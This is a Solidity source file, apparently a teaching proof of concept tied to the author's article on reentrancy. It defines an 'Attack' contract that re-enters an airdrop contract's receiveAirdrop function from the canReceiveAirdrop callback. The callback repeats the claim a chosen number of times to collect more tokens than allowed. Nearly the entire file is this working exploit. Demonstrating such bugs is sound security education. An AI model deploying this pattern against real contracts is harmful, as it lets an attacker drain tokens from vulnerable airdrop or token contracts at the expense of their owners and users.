// SPDX-License-Identifier: BSL-1.0 (Boost Software License 1.0)

//--------------------------------------------------------------------------//
// Copyright 2022 serial-coder: Phuwanai Thummavet (mr.thummavet@gmail.com) //
//--------------------------------------------------------------------------//

// For more info, please refer to my article:
//  - On Medium: (coming soon)
//  - On serial-coder.com: (coming soon)

pragma solidity 0.8.13;

import "./Dependencies.sol";

interface IAirdrop {
    function receiveAirdrop() external;
    function getUserBalance(address _user) external view returns (uint256);
}

contract Attack is IAirdropReceiver {
    IAirdrop public immutable airdrop;

    uint256 public xTimes;
    uint256 public xCount;

    constructor(IAirdrop _airdrop) {
        airdrop = _airdrop;
    }

    function canReceiveAirdrop() external override returns (bool) {
        if (xCount < xTimes) {
            xCount++;
            airdrop.receiveAirdrop();
        }
        return true;
    }

    function attack(uint256 _xTimes) external {
        xTimes = _xTimes;
        xCount = 1;

        airdrop.receiveAirdrop();
    }

    function getBalance() external view returns (uint256) {
        return airdrop.getUserBalance(address(this));
    }
}